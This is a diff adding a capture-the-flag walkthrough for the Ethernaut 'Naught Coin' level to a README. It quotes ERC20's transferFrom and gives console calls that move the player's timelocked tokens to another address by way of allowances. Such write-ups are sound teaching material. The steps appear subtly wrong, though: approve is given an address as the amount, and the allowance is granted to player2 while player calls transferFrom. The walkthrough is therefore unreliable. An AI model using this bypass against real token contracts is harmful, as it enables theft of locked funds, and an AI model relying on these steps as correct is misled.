@@ -46,6 +46,7 @@ yarn start -- <level_name>
  - [13. Privacy](#13-privacy)
  - [14. Gatekeeper One](#14-gatekeeper-one)
  - [15. Gatekeeper Two](#15-gatekeeper-two)
+ - [16. Naught Coin](#16-naught-coin)
 
 ### 1. Hello Ethernaut
 
@@ -686,3 +687,43 @@ constructor(address victim) {
 ```
 
 We just create the contract sending the victim address as parameter and that's it!
+
+---
+
+### 16. Naught Coin
+
+If you read carefully the ERC20 contract code, there is a way around to transfer your tokens without using the `transfer` function.
+
+```sol
+function transferFrom(
+  address from,
+  address to,
+  uint256 amount
+) public virtual override returns (bool) {
+  address spender = _msgSender();
+  _spendAllowance(from, spender, amount);
+  _transfer(from, to, amount);
+  return true;
+}
+```
+
+Using this function we can transfer our tokens to another address directly (note that the internal `_transfer` function was not overrided).
+
+But first we have to allow another player (player2) to receive our tokens:
+
+```js
+const player2 = '<any_address>';
+await contract.increaseAllowance(player2, await contract.INITIAL_SUPPLY());
+```
+
+Now we must give approval to the contract to make this transaction in behalf of our account:
+
+```js
+await contract.approve(player, contract.address);
+```
+
+Finally we can send all our founds from our account to the new one:
+
+```js
+await contract.transferFrom(player, player2, await contract.allowance(player, player2));
+```
